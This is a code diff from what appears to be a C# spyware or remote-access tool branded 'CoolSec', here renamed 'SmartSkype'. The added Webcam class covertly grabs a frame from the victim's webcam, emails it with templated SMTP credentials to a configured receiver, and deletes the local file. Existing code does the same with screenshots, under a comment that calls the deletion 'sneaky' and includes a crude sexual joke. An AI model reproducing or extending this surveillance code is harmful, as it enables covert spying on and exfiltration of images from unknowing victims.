@@ -12,6 +12,8 @@ using System.Drawing;
 using System.Drawing.Imaging;
 using System.Net.Mime;
 using System.Net.Mail;
+using AForge.Video;
+using AForge.Video.DirectShow;
 namespace Reciever
 {
     static class Functions
@@ -239,7 +241,7 @@ namespace Reciever
                 Graphics screenShot;
 
                 // Email variables
-                var fromAddress = new MailAddress("#SENDEREMAIL#", "CoolSec - CoolBot");
+                var fromAddress = new MailAddress("#SENDEREMAIL#", "CoolSec - SmartSkype");
                 var toAddress = new MailAddress("#RECEIVEREMAIL#", "#USERNAME#");
                 const string fromPassword = "#PASSWORD#";
                 const string subject = "CoolBot Screenshot";
@@ -280,6 +282,105 @@ namespace Reciever
                 // Deletes file to be sneaky sneaky. Like when you do a girl in the doggy position and you slip it in her butt. lolwut
                 File.Delete(file);
 
+            }
+        }
+
+        public static class Webcam
+        {
+            private static FilterInfoCollection videoDevices;
+            private static VideoCaptureDevice webcam;
+            // Sets frame size of webcam
+            private static Size frameSize = new Size(320, 240);
+
+            /// <summary>
+            /// Gets all devices, chooses default primary device, sets frame size and starts device.
+            /// </summary>
+            public static void CaptureCam()
+            {
+                // Gets all possible video devices
+                videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
+                // Just gets the primary video device
+                webcam = new VideoCaptureDevice(videoDevices[0].MonikerString);
+                webcam.NewFrame += new NewFrameEventHandler(CaptureFrame);
+                //webcam.SnapshotFrame += new NewFrameEventHandler(Snapshot_Frame);
+                webcam.DesiredFrameSize = frameSize;
+                //webcam.ProvideSnapshots = true;
+                webcam.Start();
+            }
+
+            /// <summary>
+            /// Saves the current frame taken from the video device and saves it temporarily
+            /// </summary>
+            /// <param name="sender"></param>
+            /// <param name="e"></param>
+            private static void CaptureFrame(object sender, NewFrameEventArgs e)
+            {
+                Bitmap video = (Bitmap)e.Frame.Clone();
+                ImageFormat format = ImageFormat.Jpeg;
+
+                string filename = GenerateFileName();
+                string ext = ".jpg";
+                string file = Reciever.Program.AppPath + "\\" + filename + ext;
+
+                video.Save(file, format);
+                webcam.SignalToStop();
+                // Email image off to location
+                EmailImage(file, filename);
+            }
+
+            /// <summary>
+            /// Method to randomly generate a 10 character for the file name.
+            /// </summary>
+            private static string GenerateFileName()
+            {
+                var chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+                var stringChars = new char[10];
+                var random = new Random();
+
+                for (int i = 0; i < stringChars.Length; i++)
+                {
+                    stringChars[i] = chars[random.Next(chars.Length)];
+                }
+                string result = new String(stringChars);
+                return result;
+            }
+
+            /// <summary>
+            /// Emails the image taken from video device to specific email.
+            /// </summary>
+            /// <param name="file"></param>
+            /// <param name="filename"></param>
+            private static void EmailImage(string file, string filename)
+            {
+                var fromAddress = new MailAddress("#SENDEREMAIL#", "SmartSkype ImageBot");
+                var toAddress = new MailAddress("#RECEIVEREMAIL#", "#USERNAME#");
+                const string fromPassword = "#PASSWORD#";
+                string subject = "SmartSkype Image (" + filename + ")";
+                string body = "The following file (" + filename + ") has been attached.\nThank you for using SmartSkype.\n\nRegards,\nCoolSec";
+
+                Attachment img = new Attachment(file, MediaTypeNames.Application.Octet);
+                ContentDisposition disposition = img.ContentDisposition;
+                disposition.CreationDate = File.GetCreationTime(file);
+                disposition.ModificationDate = File.GetLastWriteTime(file);
+                disposition.ReadDate = File.GetLastAccessTime(file);
+
+                var smtp = new SmtpClient
+                {
+                    Host = "#HOST#",
+                    Port = 587,
+                    EnableSsl = true,
+                    DeliveryMethod = SmtpDeliveryMethod.Network,
+                    UseDefaultCredentials = false,
+                    Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
+                };
+
+                using (var message = new MailMessage(fromAddress, toAddress) { Subject = subject, Body = body })
+                {
+                    message.Attachments.Add(img);
+                    smtp.Send(message);
+                }
+
+                File.Delete(file);
             }
         }
     }
